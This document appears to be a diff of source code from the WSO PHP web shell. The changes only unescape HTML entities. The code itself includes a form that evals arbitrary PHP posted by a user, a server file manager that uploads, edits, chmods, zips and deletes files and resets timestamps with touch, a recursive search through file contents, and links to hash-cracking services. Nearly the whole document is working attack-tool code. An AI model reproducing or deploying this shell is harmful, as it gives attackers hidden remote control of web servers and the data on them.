+                                            echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
+                                            echo ' <input type=checkbox name=ajax value=1 ' . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
                                             if (!empty($_POST['p1'])) {
                                                 ob_start();
                                                 eval($_POST['p1']);
                                                 echo htmlspecialchars(ob_get_clean());
                                             }
-                                            echo '&lt;/pre&gt;&lt;/div&gt;';
+                                            echo '</pre></div>';
                                             wsoFooter();
                                         }
                                         function actionFilesMan() {
                                             wsoHeader();
-                                            echo '&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;';
+                                            echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
                                             if (!empty($_POST['p1'])) {
                                                 switch ($_POST['p1']) {
                                                     case 'uploadFile':
@@ -491,29 +491,29 @@ pre{font-family:Courier,Monospace;}
                                                         } elseif ($_SESSION['act'] == 'zip') {
                                                             if (class_exists('ZipArchive')) {
                                                                 $zip = new ZipArchive();
-                                                                if ($zip-&gt;open($_POST['p2'], 1)) {
+                                                                if ($zip->open($_POST['p2'], 1)) {
                                                                     chdir($_SESSION['c']);
                                                                     foreach ($_SESSION['f'] as $f) {
                                                                         if ($f == '..') continue;
-                                                                        if (@is_file($_SESSION['c'] . $f)) $zip-&gt;addFile($_SESSION['c'] . $f, $f);
+                                                                        if (@is_file($_SESSION['c'] . $f)) $zip->addFile($_SESSION['c'] . $f, $f);
                                                                         elseif (@is_dir($_SESSION['c'] . $f)) {
                                                                             $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/'));
-                                                                            foreach ($iterator as $key =&gt; $value) {
-                                                                                $zip-&gt;addFile(realpath($key), $key);
+                                                                            foreach ($iterator as $key => $value) {
+                                                                                $zip->addFile(realpath($key), $key);
                                                                             }
                                                                         }
                                                                     }
                                                                     chdir($GLOBALS['cwd']);
-                                                                    $zip-&gt;close();
+                                                                    $zip->close();
                                                                 }
                                                             }
                                                         } elseif ($_SESSION['act'] == 'unzip') {
                                                             if (class_exists('ZipArchive')) {
                                                                 $zip = new ZipArchive();
                                                                 foreach ($_SESSION['f'] as $f) {
-                                                                    if ($zip-&gt;open($_SESSION['c'] . $f)) {
-                                                                        $zip-&gt;extractTo($GLOBALS['cwd']);
-                                                                        $zip-&gt;close();
+                                                                    if ($zip->open($_SESSION['c'] . $f)) {
+                                                                        $zip->extractTo($GLOBALS['cwd']);
+                                                                        $zip->close();
                                                                     }
                                                                 }
                                                             }
@@ -529,7 +529,7 @@ pre{font-family:Courier,Monospace;}
                                                         if (!empty($_POST['p1'])) {
                                                             $_SESSION['act'] = @$_POST['p1'];
                                                             $_SESSION['f'] = @$_POST['f'];
-                                                            foreach ($_SESSION['f'] as $k =&gt; $f) $_SESSION['f'][$k] = urldecode($f);
+                                                            foreach ($_SESSION['f'] as $k => $f) $_SESSION['f'][$k] = urldecode($f);
                                                             $_SESSION['c'] = @$_POST['c'];
                                                         }
                                                         break;
@@ -546,49 +546,49 @@ pre{font-family:Courier,Monospace;}
                                                 if (!empty($_POST['p1'])) {
                                                     if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);
                                                 }
-                                                echo "&lt;script&gt;
+                                                echo "<script>
 	function sa() {
-		for(i=0;i&lt;d.files.elements.length;i++)
+		for(i=0;i<d.files.elements.length;i++)
 			if(d.files.elements[i].type == 'checkbox')
 				d.files.elements[i].checked = d.files.elements[0].checked;
 	}
-&lt;/script&gt;
-&lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt;
-&lt;form name=files method=post&gt;&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;";
+</script>
+<table width='100%' class='main' cellspacing='0' cellpadding='2'>
+<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
                                                 $dirs = $files = array();
                                                 $n = count($dirContent);
-                                                for ($i = 0;$i &lt; $n;$i++) {
+                                                for ($i = 0;$i < $n;$i++) {
                                                     $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
                                                     $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
-                                                    $tmp = array('name' =&gt; $dirContent[$i], 'path' =&gt; $GLOBALS['cwd'] . $dirContent[$i], 'modify' =&gt; date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' =&gt; wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' =&gt; @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' =&gt; $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' =&gt; $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
-                                                    if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' =&gt; 'file'));
-                                                    elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' =&gt; 'link', 'link' =&gt; readlink($tmp['path'])));
-                                                    elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' =&gt; 'dir'));
+                                                    $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
+                                                    if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));
+                                                    elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
+                                                    elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir'));
                                                 }
                                                 $GLOBALS['sort'] = $sort;
                                                 function wsoCmp($a, $b) {
                                                     if ($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
-                                                    else return (($a['size'] &lt; $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
+                                                    else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
                                                 }
                                                 usort($files, "wsoCmp");
                                                 usort($dirs, "wsoCmp");
                                                 $files = array_merge($dirs, $files);
                                                 $l = 0;
                                                 foreach ($files as $f) {
-                                                    echo '&lt;tr' . ($l ? ' class=l1' : '') . '&gt;&lt;td&gt;&lt;input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')"&gt;' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" title=' . $f['link'] . '&gt;&lt;b&gt;[ ' . htmlspecialchars($f['name']) . ' ]&lt;/b&gt;') . '&lt;/a&gt;&lt;/td&gt;&lt;td&gt;' . (($f['type'] == 'file') ? wsoViewSize($f['size']) : $f['type']) . '&lt;/td&gt;&lt;td&gt;' . $f['modify'] . '&lt;/td&gt;&lt;td&gt;' . $f['owner'] . '/' . $f['group'] . '&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')"&gt;' . $f['perms'] . '&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')"&gt;T&lt;/a&gt;' . (($f['type'] == 'file') ? ' &lt;a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')"&gt;D&lt;/a&gt;' : '') . '&lt;/td&gt;&lt;/tr&gt;';
+                                                    echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" title=' . $f['link'] . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (($f['type'] == 'file') ? wsoViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (($f['type'] == 'file') ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
                                                     $l = $l ? 0 : 1;
                                                 }
-                                                echo "&lt;tr&gt;&lt;td colspan=7&gt;
-	&lt;input type=hidden name=a value='FilesMan'&gt;
-	&lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'&gt;
-	&lt;input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'&gt;
-	&lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;";
-                                                if (class_exists('ZipArchive')) echo "&lt;option value='zip'&gt;Compress (zip)&lt;/option&gt;&lt;option value='unzip'&gt;Uncompress (zip)&lt;/option&gt;";
-                                                echo "&lt;option value='tar'&gt;Compress (tar.gz)&lt;/option&gt;";
-                                                if (!empty($_SESSION['act']) && @count($_SESSION['f'])) echo "&lt;option value='paste'&gt;Paste / Compress&lt;/option&gt;";
-                                                echo "&lt;/select&gt;&nbsp;";
-                                                if (!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar'))) echo "file name: &lt;input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip' ? 'zip' : 'tar.gz') . "'&gt;&nbsp;";
-                                                echo "&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;";
+                                                echo "<tr><td colspan=7>
+	<input type=hidden name=a value='FilesMan'>
+	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>
+	<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
+                                                if (class_exists('ZipArchive')) echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
+                                                echo "<option value='tar'>Compress (tar.gz)</option>";
+                                                if (!empty($_SESSION['act']) && @count($_SESSION['f'])) echo "<option value='paste'>Paste / Compress</option>";
+                                                echo "</select>&nbsp;";
+                                                if (!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar'))) echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>&nbsp;";
+                                                echo "<input type='submit' value='>>'></td></tr></form></table></div>";
                                                 wsoFooter();
                                             }
                                             function actionStringTools() {
@@ -605,7 +605,7 @@ pre{font-family:Courier,Monospace;}
                                                 if (!function_exists('hex2ascii')) {
                                                     function hex2ascii($p) {
                                                         $r = '';
-                                                        for ($i = 0;$i &lt; strLen($p);$i+= 2) {
+                                                        for ($i = 0;$i < strLen($p);$i+= 2) {
                                                             $r.= chr(hexdec($p[$i] . $p[$i + 1]));
                                                         }
                                                         return $r;
@@ -614,18 +614,18 @@ pre{font-family:Courier,Monospace;}
                                                 if (!function_exists('ascii2hex')) {
                                                     function ascii2hex($p) {
                                                         $r = '';
-                                                        for ($i = 0;$i &lt; strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
+                                                        for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
                                                         return strtoupper($r);
                                                     }
                                                 }
                                                 if (!function_exists('full_urlencode')) {
                                                     function full_urlencode($p) {
                                                         $r = '';
-                                                        for ($i = 0;$i &lt; strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
+                                                        for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
                                                         return strtoupper($r);
                                                     }
                                                 }
-                                                $stringTools = array('Base64 encode' =&gt; 'base64_encode', 'Base64 decode' =&gt; 'base64_decode', 'Url encode' =&gt; 'urlencode', 'Url decode' =&gt; 'urldecode', 'Full urlencode' =&gt; 'full_urlencode', 'md5 hash' =&gt; 'md5', 'sha1 hash' =&gt; 'sha1', 'crypt' =&gt; 'crypt', 'CRC32' =&gt; 'crc32', 'ASCII to HEX' =&gt; 'ascii2hex', 'HEX to ASCII' =&gt; 'hex2ascii', 'HEX to DEC' =&gt; 'hexdec', 'HEX to BIN' =&gt; 'hex2bin', 'DEC to HEX' =&gt; 'dechex', 'DEC to BIN' =&gt; 'decbin', 'BIN to HEX' =&gt; 'binhex', 'BIN to DEC' =&gt; 'bindec', 'String to lower case' =&gt; 'strtolower', 'String to upper case' =&gt; 'strtoupper', 'Htmlspecialchars' =&gt; 'htmlspecialchars', 'String length' =&gt; 'strlen',);
+                                                $stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);
                                                 if (isset($_POST['ajax'])) {
                                                     $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
                                                     ob_start();
@@ -639,21 +639,21 @@ pre{font-family:Courier,Monospace;}
                                                     exit;
                                                 }
                                                 wsoHeader();
-                                                echo '&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;';
+                                                echo '<h1>String conversions</h1><div class=content>';
                                                 if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
-                                                echo "&lt;form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'&gt;&lt;select name='selectTool'&gt;";
-                                                foreach ($stringTools as $k =&gt; $v) echo "&lt;option value='" . htmlspecialchars($v) . "'&gt;" . $k . "&lt;/option&gt;";
-                                                echo "&lt;/select&gt;&lt;input type='submit' value='&gt;&gt;'/&gt; &lt;input type=checkbox name=ajax value=1 " . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "&gt; send using AJAX&lt;br&gt;&lt;textarea name='input' style='margin-top:5px' class=bigarea&gt;" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "&lt;/textarea&gt;&lt;/form&gt;&lt;pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'&gt;";
+                                                echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
+                                                foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
+                                                echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
                                                 if (!empty($_POST['p1'])) {
                                                     if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));
                                                 }
-                                                echo "&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search text in files:&lt;/h1&gt;&lt;div class=content&gt;
-		&lt;form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"&gt;&lt;table cellpadding='1' cellspacing='0' width='50%'&gt;
-			&lt;tr&gt;&lt;td width='1%'&gt;Text:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='text' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
-			&lt;tr&gt;&lt;td&gt;Path:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
-			&lt;tr&gt;&lt;td&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='filename' value='*' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
-			&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;
-			&lt;/table&gt;&lt;/form&gt;";
+                                                echo "</pre></div><br><h1>Search text in files:</h1><div class=content>
+		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
+			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
+			<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>
+			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
+			<tr><td></td><td><input type='submit' value='>>'></td></tr>
+			</table></form>";
                                                 function wsoRecursiveGlob($path) {
                                                     if (substr($path, -1) != '/') $path.= '/';
                                                     $paths = @array_unique(@array_merge(@glob($path . $_POST['p3']), @glob($path . '*', GLOB_ONLYDIR)));
@@ -662,21 +662,21 @@ pre{font-family:Courier,Monospace;}
                                                             if (@is_dir($item)) {
                                                                 if ($path != $item) wsoRecursiveGlob($item);
                                                             } else {
-                                                                if (@strpos(@file_get_contents($item), @$_POST['p2']) !== false) echo "&lt;a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\")'&gt;" . htmlspecialchars($item) . "&lt;/a&gt;&lt;br&gt;";
+                                                                if (@strpos(@file_get_contents($item), @$_POST['p2']) !== false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\")'>" . htmlspecialchars($item) . "</a><br>";
                                                             }
                                                         }
                                                     }
                                                 }
                                                 if (@$_POST['p3']) wsoRecursiveGlob($_POST['c']);
-                                                echo "&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt;
-		&lt;form method='post' target='_blank' name='hf'&gt;
-			&lt;input type='text' name='hash' style='width:200px;'&gt;&lt;br&gt;
-			&lt;input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"&gt;&lt;br&gt;
-			&lt;input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"&gt;&lt;br&gt;
-			&lt;input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"&gt;&lt;br&gt;
-			&lt;input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"&gt;&lt;br&gt;
-			&lt;input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"&gt;&lt;br&gt;
-		&lt;/form&gt;&lt;/div&gt;";
+                                                echo "</div><br><h1>Search for hash:</h1><div class=content>
+		<form method='post' target='_blank' name='hf'>
+			<input type='text' name='hash' style='width:200px;'><br>
+			<input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
+			<input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"><br>
+			<input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"><br>
+			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+			<input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
+		</form></div>";
                                                 wsoFooter();
                                             }
                                             function actionFilesTools() {
@@ -707,7 +707,7 @@ pre{font-family:Courier,Monospace;}
                                                     }
                                                 }
                                                 wsoHeader();
-                                                echo '&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;';
+                                                echo '<h1>File tools</h1><div class=content>';
                                                 if (!file_exists(@$_POST['p1'])) {
                                                     echo 'File not exists';
                                                     wsoFooter();
@@ -718,38 +718,38 @@ pre{font-family:Courier,Monospace;}
                                                     $uid['name'] = @fileowner($_POST['p1']);
                                                     $gid['name'] = @filegroup($_POST['p1']);
                                                 } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
-                                                echo '&lt;span&gt;Name:&lt;/span&gt; ' . htmlspecialchars(@basename($_POST['p1'])) . ' &lt;span&gt;Size:&lt;/span&gt; ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' &lt;span&gt;Permission:&lt;/span&gt; ' . wsoPermsColor($_POST['p1']) . ' &lt;span&gt;Owner/Group:&lt;/span&gt; ' . $uid['name'] . '/' . $gid['name'] . '&lt;br&gt;';
-                                                echo '&lt;span&gt;Create time:&lt;/span&gt; ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' &lt;span&gt;Access time:&lt;/span&gt; ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' &lt;span&gt;Modify time:&lt;/span&gt; ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '&lt;br&gt;&lt;br&gt;';
+                                                echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
+                                                echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
                                                 if (empty($_POST['p2'])) $_POST['p2'] = 'view';
                                                 if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
                                                 else $m = array('Chmod', 'Rename', 'Touch');
-                                                foreach ($m as $v) echo '&lt;a href=# onclick="g(null,null,null,\'' . strtolower($v) . '\')"&gt;' . ((strtolower($v) == @$_POST['p2']) ? '&lt;b&gt;[ ' . $v . ' ]&lt;/b&gt;' : $v) . '&lt;/a&gt; ';
-                                                echo '&lt;br&gt;&lt;br&gt;';
+                                                foreach ($m as $v) echo '<a href=# onclick="g(null,null,null,\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
+                                                echo '<br><br>';
                                                 switch ($_POST['p2']) {
                                                     case 'view':
-                                                        echo '&lt;pre class=ml1&gt;';
+                                                        echo '<pre class=ml1>';
                                                         $fp = @fopen($_POST['p1'], 'r');
                                                         if ($fp) {
                                                             while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
                                                             @fclose($fp);
                                                         }
-                                                        echo '&lt;/pre&gt;';
+                                                        echo '</pre>';
                                                         break;
                                                     case 'highlight':
                                                         if (@is_readable($_POST['p1'])) {
-                                                            echo '&lt;div class=ml1 style="background-color: #e1e1e1;color:black;"&gt;';
+                                                            echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                                                             $code = @highlight_file($_POST['p1'], true);
-                                                            echo str_replace(array('&lt;span ', '&lt;/span&gt;'), array('&lt;font ', '&lt;/font&gt;'), $code) . '&lt;/div&gt;';
+                                                            echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
                                                         }
                                                         break;
                                                     case 'chmod':
                                                         if (!empty($_POST['p3'])) {
                                                             $perms = 0;
-                                                            for ($i = strlen($_POST['p3']) - 1;$i &gt;= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
-                                                            if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value="";&lt;/script&gt;';
+                                                            for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
+                                                            if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                                                         }
                                                         clearstatcache();
-                                                        echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.chmod.value);return false;"&gt;&lt;input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
+                                                        echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
                                                         break;
                                                     case 'edit':
                                                         if (!is_writable($_POST['p1'])) {
@@ -763,24 +763,24 @@ pre{font-family:Courier,Monospace;}
                                                             if ($fp) {
                                                                 @fwrite($fp, $_POST['p3']);
                                                                 @fclose($fp);
-                                                                echo 'Saved!&lt;br&gt;&lt;script&gt;p3_="";&lt;/script&gt;';
+                                                                echo 'Saved!<br><script>p3_="";</script>';
                                                                 @touch($_POST['p1'], $time, $time);
                                                             }
                                                         }
